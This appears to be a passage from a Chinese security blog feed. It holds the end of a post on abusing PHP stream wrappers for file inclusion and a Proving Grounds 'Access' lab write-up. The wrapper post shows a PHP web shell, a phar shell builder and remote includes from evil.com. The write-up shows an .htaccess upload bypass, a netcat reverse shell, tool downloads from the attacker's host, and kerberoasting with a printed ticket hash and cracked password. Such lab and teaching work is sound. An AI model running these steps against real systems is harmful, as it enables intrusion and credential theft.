<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt; payload.php</span><br><span class="line">zip payload.zip payload.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing the log file via LFI (the # identifier is URL-encoded)</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/?parameter=zip://payload.zip%23payload.php&amp;cmd=id&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="phpar"><a href="#phpar" class="headerlink" title="phpar://"></a><code>phpar://</code></h2><p>前提：可以上传文件</p>
<p><code>phar://</code> 允许访问 <code>.phar</code> 归档文件中的数据， 原理基本同 <code>zip://</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;shell.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;shell.txt&#x27;</span>, <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php --define phar.<span class="keyword">readonly</span>=<span class="number">0</span> shell.php &amp;&amp; mv shell.phar shell.jpg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="subst">$URL</span>/?parameter=phar://./shell.jpg%2Fshell.txt&amp;cmd=id&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://evil.phar&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>如果 <code>unserialize()</code> 解析 <code>phar://</code>，也可能触发 <code>__wakeup()</code> 或 <code>__destruct()</code> 执行任意代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://evil.phar&quot;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="compress-zlib"><a href="#compress-zlib" class="headerlink" title="compress.zlib://"></a><code>compress.zlib://</code></h2><p><code>compress.zlib://</code> 利用原理同上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;compress.zlib://shell.php.gz&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="compress-bzip2"><a href="#compress-bzip2" class="headerlink" title="compress.bzip2://"></a><code>compress.bzip2://</code></h2><p>原理同上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;compress.bzip2://shell.php.bz2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ftp-ftps"><a href="#ftp-ftps" class="headerlink" title="ftp:// &#x2F; ftps://"></a><code>ftp://</code> &#x2F; <code>ftps://</code></h2><p>前提：<code>allow_url_fopen=On</code></p>
<p><code>ftp://</code> 允许 PHP 访问 FTP 服务器上的文件，攻击者可以 <strong>远程包含恶意 PHP</strong> ，触发 RCE；也可以用于  <strong>SSRF（服务器端请求伪造）</strong> ，探测内网资产</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;ftp://user:pass@evil.com/malware.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="http-https"><a href="#http-https" class="headerlink" title="http:// &#x2F; https://"></a><code>http://</code> &#x2F; <code>https://</code></h2><p><code>http://</code>允许从远程服务器加载恶意资源（如PHP脚本），执行代码或伪装合法请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://evil.com/shell.php&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><ol>
<li>禁用危险Wrappers<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_include=Off</span><br><span class="line">allow_url_fopen=Off</span><br><span class="line">disable_functions=system,passthru,exec,shell_exec,popen,proc_open</span><br></pre></td></tr></table></figure></li>
<li>使用 <code>is_readable()</code>验证文件路径<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_readable</span>(<span class="variable">$user_input_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$user_input_file</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid file&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>严格控制 <code>unserialize()</code><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>, [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; <span class="literal">false</span>]);</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a></li>
<li><a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a></li>
<li><a href="https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55">https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55</a></li>
<li><a href="https://www.freebuf.com/articles/web/193849.html">https://www.freebuf.com/articles/web/193849.html</a></li>
<li>php:&#x2F;&#x2F;filter chains:<ol>
<li><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li>
<li><a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html</a></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>How It Works-临渊羡鱼</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Access</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="categories"><a href="#categories" class="headerlink" title="categories"></a>categories</h1><p>AD</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-3.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">NetBIOS computer name<span class="punctuation">:</span> SERVER</span><br><span class="line">NetBIOS domain name<span class="punctuation">:</span> ACCESS</span><br><span class="line">DNS domain<span class="punctuation">:</span> access.offsec</span><br><span class="line">FQDN<span class="punctuation">:</span> SERVER.access.offsec</span><br><span class="line"></span><br><span class="line">OS<span class="punctuation">:</span> Windows <span class="number">10</span><span class="punctuation">,</span> Windows Server <span class="number">2019</span><span class="punctuation">,</span> Windows Server <span class="number">2016</span></span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">10.0</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;<span class="number">1809</span>&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">17763</span>&#x27;</span><br><span class="line"></span><br><span class="line">- ports</span><br><span class="line">- <span class="number">53</span></span><br><span class="line">  domain</span><br><span class="line"></span><br><span class="line">- <span class="number">80</span> / <span class="number">443</span></span><br><span class="line">  apache <span class="number">2.4</span><span class="number">.48</span> openssl/<span class="number">1.1</span>.k php/<span class="number">8.0</span><span class="number">.7</span></span><br><span class="line"></span><br><span class="line">  http-title<span class="punctuation">:</span> Access The Event</span><br><span class="line"></span><br><span class="line">  http-fetch<span class="punctuation">:</span> Please enter the complete path of the directory to save data in.</span><br><span class="line"></span><br><span class="line">- <span class="number">135</span></span><br><span class="line">  msrpc</span><br><span class="line"></span><br><span class="line">- <span class="number">139</span></span><br><span class="line">  netbios-ssn</span><br><span class="line"></span><br><span class="line">- <span class="number">445</span></span><br><span class="line">  smb</span><br><span class="line"></span><br><span class="line">- <span class="number">389</span> / <span class="number">636</span> / <span class="number">3268</span></span><br><span class="line">  ldap</span><br><span class="line"></span><br><span class="line">- <span class="number">464</span></span><br><span class="line">  kpasswd5</span><br><span class="line"></span><br><span class="line">- <span class="number">593</span></span><br><span class="line">  msrpc</span><br><span class="line"></span><br><span class="line">- <span class="number">3269</span></span><br><span class="line"></span><br><span class="line">- <span class="number">5985</span></span><br><span class="line">  winrm</span><br><span class="line">   Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">- <span class="number">9389</span></span><br><span class="line">  mc-nmf        syn-ack ttl <span class="number">125</span> .NET Message Framing</span><br><span class="line"></span><br><span class="line">- <span class="number">47001</span></span><br><span class="line">  Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">  winrm</span><br><span class="line"></span><br><span class="line">- <span class="number">88</span> udp</span><br><span class="line">  kerberos</span><br><span class="line"></span><br><span class="line">- <span class="number">123</span></span><br><span class="line">  ntp</span><br><span class="line"></span><br><span class="line">- <span class="number">65024</span></span><br><span class="line"></span><br><span class="line">things to try</span><br><span class="line"><span class="number">1.</span> web  <span class="number">80</span>/<span class="number">443</span>/<span class="number">47001</span></span><br><span class="line"><span class="number">2.</span> smb</span><br><span class="line"><span class="number">3.</span> ldapsearch</span><br><span class="line"></span><br><span class="line">web</span><br><span class="line">===============================================================</span><br><span class="line">/uploads              (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">344</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.187/uploads/]</span></span><br><span class="line">/assets               (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">343</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.187/assets/]</span></span><br><span class="line">/forms                (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">342</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.187/forms/]</span></span><br></pre></td></tr></table></figure>

<h2 id="smbcliet"><a href="#smbcliet" class="headerlink" title="smbcliet"></a>smbcliet</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">smbclient -L <span class="number">192.168</span><span class="number">.197</span><span class="number">.187</span> -N</span><br><span class="line">session setup failed<span class="punctuation">:</span> NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rpcclient <span class="number">192.168</span><span class="number">.197</span><span class="number">.187</span> -N</span><br><span class="line">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<h1 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ldapsearch -H ldap<span class="punctuation">:</span><span class="comment">//192.168.197.187 -x -b &quot;DC=access,DC=offsec&quot; |tee ldap_dump</span></span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;DC=access<span class="punctuation">,</span>DC=offsec&gt; with scope subtree</span><br><span class="line"># filter<span class="punctuation">:</span> (objectclass=*)</span><br><span class="line"># requesting<span class="punctuation">:</span> ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search<span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">result<span class="punctuation">:</span> <span class="number">1</span> Operations error</span><br><span class="line">text<span class="punctuation">:</span> <span class="number">000004</span>DC<span class="punctuation">:</span> LdapErr<span class="punctuation">:</span> DSID<span class="number">-0</span>C090A5C<span class="punctuation">,</span> comment<span class="punctuation">:</span> In order to perform this opera</span><br><span class="line"> tion a successful bind must be completed on the connection.<span class="punctuation">,</span> data <span class="number">0</span><span class="punctuation">,</span> v4563</span><br><span class="line"></span><br><span class="line"># numResponses<span class="punctuation">:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><p>访问80端口</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-2.png.png"></p>
<p>可以上传文件，上传 backdoor.php</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode.png.png"></p>
<p>修改php 大小写后缀都无法绕过，测试只要不是php就都可以</p>
<p>修改为backdoor.png，可以成功上传，但是直接访问时, content-Type是image, 不会当做php文件解析，不加后缀也一样会认为是文本文件</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-1.png.png"></p>
<p>看了wirteup, 可以先上传.htaccess 文件，内容如下。添加.hhh拓展名按php解析， 然后上传revershell.hhh</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .hhh</span><br></pre></td></tr></table></figure>

<p>执行后成功getshell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nlvp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.187</span><span class="punctuation">]</span> <span class="number">49944</span></span><br><span class="line">id</span><br><span class="line">&#x27;id&#x27; is not recognized as an internal or external command<span class="punctuation">,</span></span><br><span class="line">operable program or batch file.</span><br><span class="line">whoami</span><br><span class="line">access\svc_apache</span><br><span class="line"></span><br><span class="line">certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/nc.exe nc.exe</span></span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil<span class="punctuation">:</span> -URLCache command completed successfully.</span><br><span class="line">nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> <span class="number">4445</span> -e powershell</span><br></pre></td></tr></table></figure>

<p>shell 无法使用powershell, 嵌套一个</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nlvp <span class="number">4445</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4445</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.187</span><span class="punctuation">]</span> <span class="number">49837</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\xampp\htdocs\uploads&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">access\svc_apache</span><br><span class="line">PS C<span class="punctuation">:</span>\xampp\htdocs\uploads&gt;</span><br></pre></td></tr></table></figure>

<p>使用bloodHound, winPeas都没有收集到能提权的信息， 用户有Administrator krbtgt svc_mssql</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\SERVER</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            krbtgt                   svc_mssql</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><p>使用powerView， get-netuser svc_mssql，发现其有SPN， 可以利用kerberoasting攻击</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PS C<span class="punctuation">:</span>\users\public&gt; iwr -uri  http<span class="punctuation">:</span><span class="comment">//192.168.45.189/PowerView.ps1 -o PowerView.ps1</span></span><br><span class="line">iwr -uri  http<span class="punctuation">:</span><span class="comment">//192.168.45.189/PowerView.ps1 -o PowerView.ps1</span></span><br><span class="line">PS C<span class="punctuation">:</span>\users\public&gt; net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\SERVER</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt</span><br><span class="line">svc_apache               svc_mssql</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\users\public&gt; import-module .\PowerView.ps1</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line">PS C<span class="punctuation">:</span>\users\public&gt; get-netuser svc_mssql</span><br><span class="line">get-netuser svc_mssql</span><br><span class="line"></span><br><span class="line">company                       <span class="punctuation">:</span> Access</span><br><span class="line">logoncount                    <span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">badpasswordtime               <span class="punctuation">:</span> <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span> <span class="number">4</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span> PM</span><br><span class="line">distinguishedname             <span class="punctuation">:</span> CN=MSSQL<span class="punctuation">,</span>CN=Users<span class="punctuation">,</span>DC=access<span class="punctuation">,</span>DC=offsec</span><br><span class="line">objectclass                   <span class="punctuation">:</span> <span class="punctuation">&#123;</span>top<span class="punctuation">,</span> person<span class="punctuation">,</span> organizationalPerson<span class="punctuation">,</span> user<span class="punctuation">&#125;</span></span><br><span class="line">lastlogontimestamp            <span class="punctuation">:</span> <span class="number">4</span>/<span class="number">8</span>/<span class="number">2022</span> <span class="number">2</span><span class="punctuation">:</span><span class="number">40</span><span class="punctuation">:</span><span class="number">02</span> AM</span><br><span class="line">name                          <span class="punctuation">:</span> MSSQL</span><br><span class="line">objectsid                     <span class="punctuation">:</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-537427935</span><span class="number">-490066102</span><span class="number">-1511301751</span><span class="number">-1104</span></span><br><span class="line">samaccountname                <span class="punctuation">:</span> svc_mssql</span><br><span class="line">codepage                      <span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">samaccounttype                <span class="punctuation">:</span> USER_OBJECT</span><br><span class="line">accountexpires                <span class="punctuation">:</span> NEVER</span><br><span class="line">cn                            <span class="punctuation">:</span> MSSQL</span><br><span class="line">whenchanged                   <span class="punctuation">:</span> <span class="number">7</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">5</span><span class="punctuation">:</span><span class="number">23</span><span class="punctuation">:</span><span class="number">18</span> PM</span><br><span class="line">instancetype                  <span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">usncreated                    <span class="punctuation">:</span> <span class="number">16414</span></span><br><span class="line">objectguid                    <span class="punctuation">:</span> <span class="number">05153e48</span><span class="number">-7</span>b4b<span class="number">-4182</span>-a6fe<span class="number">-22</span>b6ff95c1a9</span><br><span class="line">lastlogoff                    <span class="punctuation">:</span> <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span> <span class="number">4</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span> PM</span><br><span class="line">objectcategory                <span class="punctuation">:</span> CN=Person<span class="punctuation">,</span>CN=Schema<span class="punctuation">,</span>CN=Configuration<span class="punctuation">,</span>DC=access<span class="punctuation">,</span>DC=offsec</span><br><span class="line">dscorepropagationdata         <span class="punctuation">:</span> <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span> AM</span><br><span class="line">serviceprincipalname          <span class="punctuation">:</span> MSSQLSvc/DC.access.offsec</span><br><span class="line">givenname                     <span class="punctuation">:</span> MSSQL</span><br><span class="line">lastlogon                     <span class="punctuation">:</span> <span class="number">4</span>/<span class="number">8</span>/<span class="number">2022</span> <span class="number">2</span><span class="punctuation">:</span><span class="number">40</span><span class="punctuation">:</span><span class="number">02</span> AM</span><br><span class="line">badpwdcount                   <span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">useraccountcontrol            <span class="punctuation">:</span> NORMAL_ACCOUNT<span class="punctuation">,</span> DONT_EXPIRE_PASSWORD</span><br><span class="line">whencreated                   <span class="punctuation">:</span> <span class="number">4</span>/<span class="number">8</span>/<span class="number">2022</span> <span class="number">9</span><span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span><span class="number">43</span> AM</span><br><span class="line">countrycode                   <span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">primarygroupid                <span class="punctuation">:</span> <span class="number">513</span></span><br><span class="line">pwdlastset                    <span class="punctuation">:</span> <span class="number">5</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">5</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">45</span> AM</span><br><span class="line">msds-supportedencryptiontypes <span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">usnchanged                    <span class="punctuation">:</span> <span class="number">73754</span></span><br></pre></td></tr></table></figure>

<h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/Rubeus.exe Rubeus.exe</span></span><br><span class="line">certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/Rubeus.exe Rubeus.exe</span></span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil<span class="punctuation">:</span> -URLCache command completed successfully.</span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/RunasCs.cs RunasCs.cs</span></span><br><span class="line">certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/RunasCs.cs RunasCs.cs</span></span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil<span class="punctuation">:</span> -URLCache command completed successfully.</span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; ./Rubeus kerberoast /nowrap</span><br><span class="line">./Rubeus kerberoast /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2<span class="number">.1</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Action<span class="punctuation">:</span> Kerberoasting</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> NOTICE<span class="punctuation">:</span> AES hashes will be returned for AES-enabled accounts.</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span>         Use /ticket<span class="punctuation">:</span>X or /tgtdeleg to force RC4_HMAC for these accounts.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Target Domain          <span class="punctuation">:</span> access.offsec</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Searching path &#x27;LDAP<span class="punctuation">:</span><span class="comment">//SERVER.access.offsec/DC=access,DC=offsec&#x27; for &#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Total kerberoastable users <span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> SamAccountName         <span class="punctuation">:</span> svc_mssql</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> DistinguishedName      <span class="punctuation">:</span> CN=MSSQL<span class="punctuation">,</span>CN=Users<span class="punctuation">,</span>DC=access<span class="punctuation">,</span>DC=offsec</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ServicePrincipalName   <span class="punctuation">:</span> MSSQLSvc/DC.access.offsec</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> PwdLastSet             <span class="punctuation">:</span> <span class="number">5</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">5</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">45</span> AM</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Supported ETypes       <span class="punctuation">:</span> RC4_HMAC_DEFAULT</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Hash                   <span class="punctuation">:</span> $krb5tgs$<span class="number">23</span>$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$<span class="number">382</span>AA795CCF9A04F44CEEEFCD1FD8F33$CD7620E731C3743BAC17757BC77D028468BAA335A8FB42FCDE33707E966ED4B62BBA771B68A2EBDC14BC3070767B1071413FB28333989028686F60143BEBC69CA96BD477633BED94E818DCB2471F666719A777D323DA3753699EF9BB3B367788AFBAC833437ADD2CFE453D30488444284672BE8CC1D39A32CF55A65BA162A704A7DFAE2B4597D617FBFB968D9D8574BC347478101DB03AC4AE76E89EE3609E8652DADDEC97DFD78990F866FF9396BC0EC2F2A169BC2D8FF51F608FFBC28DB9958E7B3C7982AF81DC9A319F8A3D83F446DB7C3C0984EF8A6BD1C5DFC4FC1BD94B032E72CB3AA31C2841A6171B6DA894E1E813FE243DD1D46959D627B54CC6FB0C877A041AA68F10425E8E8E49B185300A8206E0273C74F040E6892FDC11A9AAB1B6687FEC4CD7D4C518F8E3F8178002359A7ED4D2AD85E0A4E0257E23C4B4715BB161E0781BD4F3B8DD8F743256F72F578D67F6E0B854A5870DF4AC1CCA89B3EEE438BB81DD2DBE3008078E5A4E6BC597DC1F9286C0FE34DE1F0E18E788185E3D0651378354724C61D8B31974DCB7489F876C11ED95C34760B8341DBDECF32901DF2FEE6C0A40D0B2BC318DA8B2606D0AD94F215398EC2C4C99166E84906704C3411441888ED49E6AE6E535B272C2FCE416F0AFC9A2C3AF93F20B80FCBF9DB849B9DE7194F4A1AC1CE34F34990FC23204204835919AA46B778593E3892CAFFD6CC93157C3F2D7F4D8D11890F33B177BA3185DDB594D8B405BACEF4ACCEDAA43B8E1EA78FE2C4694FAF4C337465A2DBE9926113BB69D94F965B6F081E5596187617023D26C518D64B68207CEB1C7649AEC8F8455DE244A77BA416E90062A86D8AE527C9425C7240B856299C136099ADC853DE1902C0ED03E59C8AD0C9CA6CCD01AC692BDA53E9244BF5190B304EF9841FFC3A93FD958FD5F90C4E0630756F78E3603A636D38AE94DB666551F0B0382F96E6F66ED26A653C3E4E061F3AF9275ECED949D771EF7C00E811EFDA3F6ED7838674D10F6164F7BD1EC889178DEECC3C8A77FE968A9445258EBE43E289003485492B5812259292A3DE447A70D4A3A12020D1E1868262D6E4CA0627E2CF011F542B74750BF029E3AD751307890A155F1C5F17B998575EDB97FBA20BF41FF3EAEA109E3E2D5B6D8908AF766FACC5F7812727F2E99B120D269051AFFFC3CF1F61E4549DC1825930D4695E25D1729F22C1568B65CB4F774897E2FA7927DEDE7FC71D837218A3E01969AB5931200BC39941DDF1E78A467DD3FFB0261DA1C5D86AD2F3F118611D481A6EEC6AC4750EFBBDD9FA122365D483FDDDF28E9CFC7AF3B705753CCCDFB67DF96BE2B4F7FFAC53BBBA1D9D99A361E343DB6F14136DF720CFD3F6EDEE700D9A2B1F3CB49ADF22164A1C604A7C84288742E4241DFCF8B7F8CC5388663CA4C732CE9EAE625ECB4AFE44B7E83386E7C4226E71AA56DB9E8810BB41BD3DE841D1DB1D9AE7DC525BBA7C5D564FEBC518347D5E785A39E301134BB50BC2BD3EBDF979E291A4A4C37EC53D42289122C120CA31325CC8D729A68F32FC86CDB575D0E5F89B482508C14C9D959B996F3F95F918B3CE3BD6CB369F196458290680F5135</span><br></pre></td></tr></table></figure>

<p>破解hash，得到密码为trustno1</p>
